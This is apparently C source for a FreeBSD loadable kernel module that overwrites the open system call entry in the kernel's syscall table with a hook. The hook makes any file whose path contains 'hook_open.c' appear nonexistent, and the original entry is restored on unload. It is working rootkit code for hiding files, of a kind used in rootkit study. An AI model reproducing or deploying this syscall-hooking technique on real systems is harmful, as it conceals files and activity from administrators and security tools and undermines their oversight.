#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/uio.h>
#include <sys/malloc.h>
#include <sys/errno.h>
#include <sys/syslog.h>
#include <sys/libkern.h>
#include <sys/dirent.h>


static int open_hook(struct thread *td, void *syscall_args){

	struct open_args /* {
		char *path;
		int flags;
	} */ *uap;
	
	uap = (struct open_args *)syscall_args;

	char path[255];
	size_t done;
	int error;

	error = copyinstr(uap->path, path, 255, &done);
	if (error != 0)
		return(error);

	char* file = "hook_open.c";
	//uprintf("%s\n",path);
	
	// if the path has the file name in it, throw file does not exist error
	if (strstr(path, file) != NULL){
		return(ENOENT);
	}

	return (sys_open(td, syscall_args));
}


static int
load(struct module *module, int cmd, void *arg){

        int error = 0;

        switch(cmd) {
        case MOD_LOAD:
                /* replace open entry with open_hook */
                sysent[SYS_open].sy_call = (sy_call_t *) open_hook;
                printf("open loaded\n");
                break;

        case MOD_UNLOAD:
                /* unhook */
                sysent[SYS_open].sy_call = (sy_call_t *) sys_open;
                printf("open unloaded\n");
                break;

        default:
                error = EOPNOTSUPP;
                break;
        }

        return(error);
}



static moduledata_t open_hook_mod = {
	"open_hook",
	load,
	NULL
};

DECLARE_MODULE(open_hook, open_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
